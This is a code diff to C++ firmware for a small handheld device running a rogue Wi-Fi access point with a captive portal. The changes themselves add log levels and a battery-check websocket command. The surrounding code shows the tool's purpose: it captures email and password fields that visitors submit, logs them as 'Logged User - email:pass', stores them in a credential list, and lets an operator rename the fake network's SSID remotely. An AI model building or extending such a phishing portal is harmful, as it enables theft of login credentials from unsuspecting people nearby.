@@ -20,7 +20,7 @@ void setupWifi(const char *ssid, const IPAddress &localIP, const IPAddress &gate
   Serial.print("AP IP address: ");
   Serial.println(myIP);
 
-  console.log("AP IP: " + myIP.toString());
+  console.log("AP IP: " + myIP.toString(), Console::LogType::INFO);
 }
 
 void setupDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
@@ -74,7 +74,7 @@ void setupWebServer(AsyncWebServer &server, const IPAddress &localIP) {
       userData.email = request->getParam("email", true)->value().c_str();
       userData.pass = request->getParam("password", true)->value().c_str();
 
-      console.log("Logged User - " + (String)userData.email + ":" + (String)userData.pass);
+      console.log("Logged User - " + (String)userData.email + ":" + (String)userData.pass, Console::LogType::ALERT);
 
       credsList.add(userData);
 
@@ -104,7 +104,7 @@ void onWebSocketEvent(uint8_t client_number,
     // Client has disconnected
     case WStype_DISCONNECTED:
       Serial.printf("[%u] Disconnected!\n", client_number);
-      console.log("[" + ((String) client_number) + "]" + " Disconnected");
+      console.log("[" + ((String) client_number) + "]" + " Disconnected", Console::LogType::ERROR);
       break;
 
     // New client has connected
@@ -113,7 +113,7 @@ void onWebSocketEvent(uint8_t client_number,
         IPAddress ip = webSocket.remoteIP(client_number);
         Serial.printf("[%u] Connection from ", client_number);
         Serial.println(ip.toString());
-        console.log("[" + ((String) client_number) + "]" + " Connected from " + ip.toString());
+        console.log("[" + ((String) client_number) + "]" + " Connected from " + ip.toString(), Console::LogType::ALERT);
       }
       break;
 
@@ -126,7 +126,7 @@ void onWebSocketEvent(uint8_t client_number,
       if (error) {
         Serial.print("deserializeJson() returned ");
         Serial.println(error.c_str());
-        console.log("Bad JSON");
+        console.log("Bad JSON", Console::LogType::ERROR);
         return;
       }
 
@@ -134,7 +134,7 @@ void onWebSocketEvent(uint8_t client_number,
 
       // Print out raw message
       Serial.printf("[%u] Received text: %s\n", client_number, action);
-      console.log("[" + ((String) client_number) + "]" + " sent a message");
+      console.log("[" + ((String) client_number) + "]" + " sent a message", Console::LogType::ALERT);
 
       // Shutdown portal and device
       if ( strcmp((char *)action, "shutdown") == 0 ) {
@@ -147,7 +147,7 @@ void onWebSocketEvent(uint8_t client_number,
         const char* newSSID = jsonDoc["value"];
 
         Serial.printf("[%u] New SSID: %s\n", client_number, newSSID);
-        console.log("[" + ((String) client_number) + "]" + " - NEW SSID: " + newSSID);
+        console.log("[" + ((String) client_number) + "]" + " - NEW SSID: " + newSSID, Console::LogType::ALERT);
 
         closePortal();
         delay(5000);
@@ -171,9 +171,22 @@ void onWebSocketEvent(uint8_t client_number,
 
           webSocket.sendTXT(client_number, data);
         }
-      } else {
+      } else if ( strcmp((char *)action, "batteryCheck") == 0 ) {
+        float mult = StickCP2.Power.getBatteryVoltage() / MAX_VOLTAGE;
+
+        int battery_level = (int) round(mult * 100);
+
+        JsonDocument jsonDoc;
+    
+        jsonDoc["battery"] = battery_level;
+
+        char data[200];
+        serializeJson(jsonDoc, data); 
+
+        webSocket.sendTXT(client_number, data);
+      } else { // Message not recognized
         Serial.printf("[%u] Message not recognized\n", client_number);
-        console.log("[" + ((String) client_number) + "]" + " - Message not recognized");
+        console.log("[" + ((String) client_number) + "]" + " - Message not recognized", Console::LogType::ERROR);
       }
     }
     break;
@@ -204,7 +217,7 @@ void openPortalSSID(const char *ssid) {
   portalOpen = true;
 
   Serial.println("Server started");
-  console.log("Server started");
+  console.log("Server started", Console::LogType::INFO);
 }
 
 void openPortal() {
@@ -219,7 +232,7 @@ void closePortal() {
   portalOpen = false;
 
   Serial.println("Server closed");
-  console.log("Server closed");
+  console.log("Server closed", Console::LogType::INFO);
 }
 
 void portalLoop() {
